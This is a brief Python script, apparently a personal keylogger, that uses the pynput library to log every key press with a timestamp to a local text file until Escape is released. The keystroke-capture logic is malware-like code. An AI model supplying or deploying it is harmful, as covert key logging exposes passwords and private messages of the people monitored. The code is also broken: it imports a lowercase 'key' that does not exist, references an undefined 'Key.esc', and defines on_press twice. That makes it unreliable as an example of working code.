from pynput.keyboard import key,Listener
import logging
log_dir = r"C:/Users/Andreas/logger/"
logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def on_press(key):
    logging.info(str(key))



def on_release(key):
    if key == Key.esc:
        return False
    
with Listener(on_press=on_press,on_release=on_release ) as listener:
    listener.join()
